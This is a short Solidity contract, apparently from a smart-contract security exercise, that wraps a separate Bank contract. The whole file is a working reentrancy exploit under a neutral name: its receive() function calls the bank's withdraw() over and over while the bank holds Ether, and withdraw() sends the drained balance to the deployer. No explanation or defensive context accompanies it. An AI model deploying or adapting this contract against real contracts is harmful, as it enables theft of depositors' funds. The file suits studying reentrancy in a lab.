// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Bank} from "./Bank.sol";

contract MyContract {

    Bank bank;
    address owner;

    constructor(address _bank) {
        bank = Bank(_bank);
        owner = msg.sender;
    }

    function deposit() public payable {
        bank.deposit{value: msg.value}();
    }

    function withdraw() public {
        bank.withdraw();

        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }
}

